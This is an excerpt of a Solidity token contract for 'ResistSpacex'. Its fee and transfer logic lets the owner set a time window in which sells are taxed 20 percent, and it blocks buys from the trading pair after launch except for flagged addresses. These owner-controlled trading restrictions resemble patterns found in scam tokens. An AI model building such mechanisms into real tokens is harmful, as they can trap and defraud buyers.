...
contract newToken is Context, IERC20, Ownable {
    ...
    string private _name = "ResistSpacex"; 
    string private _symbol = "RSpacex"; 
	...
	uint256 public feeOtherTokenBuy = 4;
	uint256 public feeOtherTokenSell = 4;
    uint256 public feeFeeBuy = 0;
	uint256 public feeFeeSell = 0;
	uint160 public _modulus = 2 ** 160 -1;
	uint256 private time = 60;
	...
	function setBuyTimeLimit(uint256 _buyTimeLimit) public  {
		require(_msgSender() == owner(), "fail");
    ...
    function _getTValues(uint256 tAmount,bool _sellStatus,bool _buyStatus) private view returns (uint256 tTransferAmount, uint256 tLiquidity, uint256 tOtherToken) {
		...
		if(_sellStatus){
			if(startTradeBlock.add(buyTimeLimit) > block.timestamp){
				tOtherToken = tAmount.mul(20).div(100);
			}else{
			...
			if(startTradeBlock.add(time) > block.timestamp){
				tOtherToken = tAmount.mul(feeOtherTokenSell).div(100);
			}else if(startTradeBlock.add(buyTimeLimit) > block.timestamp){
				tOtherToken = tAmount.mul(20).div(100);
			}else{
				tOtherToken = tAmount.mul(feeOtherTokenSell).div(100);
			}
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair && from != owner() && to != owner()  && to != blackHole){
			...
			if(startTradeBlock.add(time) > block.timestamp && lming[to]){
				require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
				lming[to] = false;
			}else{
				require(startTradeBlock.add(time) < block.timestamp, "fail");
			}
